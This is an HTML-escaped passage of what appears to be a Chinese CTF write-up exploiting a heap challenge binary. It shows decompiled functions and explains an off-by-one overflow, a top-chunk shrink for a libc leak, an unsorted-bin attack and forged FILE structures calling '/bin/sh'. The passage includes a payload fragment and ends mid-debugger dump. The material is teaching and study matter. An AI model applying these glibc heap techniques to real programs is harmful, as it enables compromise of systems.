&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index of page :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;out of page:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(&amp;amp;ptrlist)[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Not found !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Page #%u \n&amp;quot;&lt;/span&gt;, idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :\n%s\n&amp;quot;&lt;/span&gt;, (&amp;amp;ptrlist)[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;edit函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#edit函数&#34;&gt;#&lt;/a&gt; edit 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight v&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; edit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index of page :&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 &amp;gt; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;out of page:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(&amp;amp;ptrlist)[v1] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;Not found !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  readck((__int64)(&amp;amp;ptrlist)[v1], sizelist[v1]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sizelist[v1] = strlen((&amp;amp;ptrlist)[v1]);        &lt;span class=&#34;comment&#34;&gt;// 更新size，但是，readck不会加设空结尾，不对齐输入，可以造成溢出1字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里虽然会更新 size，但是如果我们读入的 text，刚好填充 chunk 的用户区，但是结尾不是’\x00’，更新长度的时候，会把下一个堆块的 size 算进去。造成溢出，如果是 topchunk_size 溢出会更多&lt;/p&gt;
&lt;h3 id=&#34;updatename函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#updatename函数&#34;&gt;#&lt;/a&gt; updatename 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;updatename&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Author : %s\n&amp;quot;&lt;/span&gt;, auther);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Page : %u\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)count);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do you want to change the author ? (yes:1 / no:0) &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    readnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h2&gt;
&lt;p&gt;程序的一的大漏洞就是对于输入的字符串只会检查换行符，而不会见擦汗输入是否有结束符，输入 name 的时候，党字符串长度为 64 时，就会接上 gptr, 导致堆地址泄露。&lt;/p&gt;
&lt;p&gt;程序没有 free，如何泄露 libc？&lt;/p&gt;
&lt;p&gt;add 时，判断错误，会导致读入第九个在 sizelist 的位置，所以修改 sizelist [0] 的大小为 0，readck 允许读入为 0。导致再次 edit ptrlist [0] 时读入很大数据溢出。修改 topchunk：&lt;/p&gt;
&lt;p&gt;edit 时，对于非对齐输入，会造成溢出，将下一个堆块的 size，计入当前堆块 content 的 size，topchunk 溢出 3 字节，其他堆块溢出 1 字节。通过三字节的溢出将 topchunk 变得很小。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;updatename 的时候使用了 scnaf (&amp;quot;% d&amp;quot;)，这有点奇怪，因为 scanf 需要用到堆空间来处理缓存：（这里没有任何利用价值）：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;关键还是在于修改 topchunk , 党 topchunk_size 小于申请的空间大小时，会释放 topchunk 进入 unsortedbins, 这样就会造成 libc 及地址的泄露。&lt;/p&gt;
&lt;p&gt;当我们已经申请了 8 个 page，如果 size [0]==0，就可以绕过检查，额外申请出来一个 page，将地址返回写道 size [0]，那么，再次 edit ptrlist [0] 时，就可以实现溢出，（因为地址很大，足够溢出）&lt;/p&gt;
&lt;p&gt;同时，更新 comment 的长度依旧是检查空字符，所以可以使的更新后对应的 size 为 0，导致第九个指针变量为 0，可以继续申请堆块，这个可以重复利用。&lt;/p&gt;
&lt;p&gt;如此，旧的 topchunk 在 unsortedbins 里面，修改其 bk 指针，利用 unsortedbins attack 实现任意地址写大数据（main_arena+88），&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f7ba0e31540&lt;/span&gt; &amp;lt;_IO_2_1_stderr_&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//payload = b&amp;#x27;/bin/sh\x00&amp;#x27;+p64(0x61)+p64(main_arena)+p64(list_all-0x10)+p64(2)+p64(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _IO_list_all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b78&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面很巧妙的东西来了，我们伪造_IO_list_all 的数据为 main_arena+88, 那么原本_  _chain 指向下一个 file 结构体，结果 fakeFIlede 的 chain 就是 smallbins 的入口马志翔里面的第一个 chunk。所以我们将 unsortedbin 里面的 topchunk 的 size 变小，就会进入 smallbin，然后 fakefile_chain --&amp;gt;topchunk，我们利用溢出将 topchunk 伪造成另一个 fakefile2，并伪造 vtable。伪造 fakefile2 要注意， flag 写入的是‘/bin/sh\x00’ , 因为 vtable 里面的函数大多会以 flag 作为自己的参数。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) &lt;span class=&#34;number&#34;&gt;0x7f7ba0e30b78&lt;/span&gt;   &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;&amp;gt; &lt;span class=&#34;comment&#34;&gt;//伪造的第一个fakefile&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _flags = &lt;span class=&#34;number&#34;&gt;17100832&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_ptr = &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_end = &lt;span class=&#34;number&#34;&gt;0x102c2c0&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_read_base = &lt;span class=&#34;number&#34;&gt;0x7f7ba0e31510&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, 